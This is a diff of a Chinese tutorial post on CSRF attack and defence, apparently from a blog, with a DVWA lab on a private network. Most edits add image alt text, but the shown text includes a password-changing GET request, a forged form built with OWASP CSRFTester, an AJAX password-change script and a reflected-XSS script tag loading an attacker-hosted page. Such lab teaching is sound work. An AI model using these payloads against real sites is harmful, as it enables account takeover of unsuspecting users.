@@ -22,17 +22,15 @@ date: 2019-08-22 09:27:05
 
 　　尽管听起来跟XSS跨站脚本攻击有点相似，但事实上CSRF与XSS差别很大，**XSS**利用的是**站点内的信任用户**，而**CSRF**则是**通过伪装来自受信任用户的请求来利用受信任的网站**。
 
+　　与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。
 
-
-与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。
-
-![](CSRF的攻击与防御原理/CSRF攻击模型.jpeg)
+![CSRF攻击模型](CSRF的攻击与防御原理/CSRF攻击模型.jpeg)
 
 　　上图为CSRF攻击的一个简单模型，用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。
 
 ### CSRF的攻击原理
 
-![](CSRF的攻击与防御原理/CSRF的攻击原理.jpeg)
+![CSRF的攻击原理](CSRF的攻击与防御原理/CSRF的攻击原理.jpeg)
 
 1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
 
@@ -91,13 +89,13 @@ date: 2019-08-22 09:27:05
 
 #### CSRF漏洞🔺Get方式利用
 
-![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用.png)
+![CSRF漏洞-Get方式利用](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用.png)
 
 漏洞确认：
 
 1、修改密码，没有对原密码进行验证，直接修改了， 判断缺少验证机制，可能存在CSRF
 
-![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认.png)
+![CSRF漏洞-Get方式利用-漏洞确认](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认.png)
 
 2、确认referer无限制，无token
 
@@ -105,7 +103,7 @@ date: 2019-08-22 09:27:05
 http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
 ```
 
-![](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认2.png)
+![CSRF漏洞-Get方式利用-漏洞确认2](CSRF的攻击与防御原理/CSRF漏洞-Get方式利用-漏洞确认2.png)
 
 漏洞利用：
 
@@ -145,23 +143,23 @@ http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&password
 
 找到`/csrf的low.php`，将`$＿GET`修改为`$＿REQUEST`(说明:这个表示可以用get也可以用POST)
 
-![](CSRF的攻击与防御原理/POST方式.png)
+![POST方式](CSRF的攻击与防御原理/POST方式.png)
 
-![](CSRF的攻击与防御原理/POST方式2.png)
+![POST方式2](CSRF的攻击与防御原理/POST方式2.png)
 
 测试是否成功修改POST提交方式
 
 POST方式提交，提交后URL不会出现具体的参数及参数值
 
-![](CSRF的攻击与防御原理/POST方式验证.png)
+![POST方式验证](CSRF的攻击与防御原理/POST方式验证.png)
 
 抓取POST提交方式的数据包
 
-![](CSRF的攻击与防御原理/POST方式抓包结果)
+![POST方式抓包结果](CSRF的攻击与防御原理/POST方式抓包结果.png)
 
 通过OWASP CSRFTester抓包
 
-![](CSRF的攻击与防御原理/CSRFTester.png)
+![CSRFTester](CSRF的攻击与防御原理/CSRFTester.png)
 
 OWASP CSRFTester构建表单
 
@@ -177,11 +175,11 @@ Link：创建一个a标签的超链接（只能get）
 
 修改上一步生产的index.html
 
-![](CSRF的攻击与防御原理/CSRFTester创建的表单.png)
+![CSRFTester创建的表单](CSRF的攻击与防御原理/CSRFTester创建的表单.png)
 
-将文档放置在csrf站点，http://192.168.123.130/csrf/index.html
+将文档放置在csrf站点，`http://192.168.123.130/csrf/index.html`
 
-![](CSRF的攻击与防御原理/CSRFTester放置站点.png)
+![CSRFTester放置站点](CSRF的攻击与防御原理/CSRFTester放置站点.png)
 
 测试
 
@@ -208,9 +206,9 @@ xmlhttp.send(“password_new=123456&password_conf=123456”&Change=Change”);
 </script>
 ```
 
-![](CSRF的攻击与防御原理/ajax.png)
+![ajax](CSRF的攻击与防御原理/ajax.png)
 
-http://192.168.123.130/csrf/ajax.html
+`http://192.168.123.130/csrf/ajax.html`
 
 3、在dvwa下，利用反射型XSS更改密码
 
@@ -218,13 +216,13 @@ http://192.168.123.130/csrf/ajax.html
 <script src="http://192.168.123.130/csrf/ajax.html"></script>
 ```
 
-![](CSRF的攻击与防御原理/利用反射型XSS更改密码.png)
+![利用反射型XSS更改密码](CSRF的攻击与防御原理/利用反射型XSS更改密码.png)
 
 此时密码已经修改
 
 4、用admin和password登录成功
 
-![](CSRF的攻击与防御原理/登陆成功.png)
+![登陆成功](CSRF的攻击与防御原理/登陆成功.png)
 
 　　如果在目标站点本身上存在XSS，则可以这样利用，使用`<script>，<img>`标签。但目标站点如果存在XSS，则直接利用XSS比利用CSRF更便捷。
 
